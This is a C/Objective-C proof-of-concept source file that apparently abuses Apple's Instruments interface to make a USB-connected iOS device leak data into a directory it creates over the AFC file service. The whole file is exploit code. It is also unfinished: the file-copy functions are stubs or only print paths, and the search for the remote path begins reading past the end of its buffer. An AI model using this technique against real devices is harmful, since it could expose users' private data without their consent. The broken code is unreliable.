#include <assert.h>
#include <ftw.h>
#include <stdio.h>

#include <libimobiledevice/afc.h>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>

#import "Instruments.h"
#include <Foundation/Foundation.h>

#define LABEL "cc"

#define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", __VA_ARGS__)

#define DEV_OK(expr) assert(expr == IDEVICE_E_SUCCESS)
#define LD_OK(expr) assert(expr == LOCKDOWN_E_SUCCESS)
#define AFC_OK(expr) assert(expr == AFC_E_SUCCESS)

#define AFC_CHECK(expr)                                                                                                \
  err = expr;                                                                                                          \
  if (err != AFC_E_SUCCESS)                                                                                            \
    return err;

afc_error_t afc_cp_file(afc_client_t afc, const char *remote, const char *lcoal) { return AFC_E_SUCCESS; }

afc_error_t afc_cp_dir(afc_client_t afc, const char *remote, const char *local) {
  char **list = NULL;
  afc_error_t err = 0;

  AFC_CHECK(afc_read_directory(afc, remote, &list));

  char remote_name[PATH_MAX];
  char local_name[PATH_MAX];
  char **p = list;
  while (*p) {
    snprintf(remote_name, sizeof(remote_name), "%s/%s", remote, *p);
    puts(remote_name);
    snprintf(local_name, sizeof(local_name), "%s/%s", local, *p);
    puts(local_name);
    p++;
  }
  afc_dictionary_free(list);
  return AFC_E_SUCCESS;
}

void leak(const char *remote) {
  @autoreleasepool {
    NSString *path = [NSString stringWithUTF8String:remote];
    Instruments *api = [[Instruments alloc] init];
    XRRemoteDevice *device = [api devices].firstObject;
    NSString *leaked = [api leakDevice:device to:path];
    NSLog(@"%@", leaked);
  }
}

static int rm(const char *pathname, const struct stat *sbuf, int type, struct FTW *ftwb) {
  if (remove(pathname) < 0) {
    perror("ERROR: remove");
    return -1;
  }
  return 0;
}

int main(int argc, char *argv[]) {
  idevice_t dev = NULL;
  lockdownd_service_descriptor_t port = NULL;
  lockdownd_client_t lockdown = NULL;
  afc_client_t afc;
  char *udid;

  DEV_OK(idevice_new(&dev, NULL));
  DEV_OK(idevice_get_udid(dev, &udid));
  LOG("uuid: %s", udid);
  LD_OK(lockdownd_client_new_with_handshake(dev, &lockdown, LABEL));
  LD_OK(lockdownd_start_service(lockdown, "com.apple.afc", &port));
  AFC_OK(afc_client_new(dev, port, &afc));

  char template[] = "/tmp/leak-poc.XXXXXX";
  char *local = mkdtemp(template);
  char *remote = NULL;
  {
    char *p = template + sizeof(template);
    while (*p != '/' && p > template)
      p--;
    remote = p;
  }

  LOG("temp: %s", local);
  LOG("remote: %s", remote);

  // mess up
  AFC_OK(afc_make_directory(afc, remote));
  printf("%s\n", remote);
  leak(remote);
  getchar();
  // cp -r

  // cleanup
  AFC_OK(afc_remove_path_and_contents(afc, remote));
  nftw(local, rm, 10, FTW_DEPTH|FTW_MOUNT|FTW_PHYS);

cleanup:
  lockdownd_client_free(lockdown);
  idevice_free(dev);

  afc = NULL;
  dev = NULL;
  lockdown = NULL;
  return 0;
}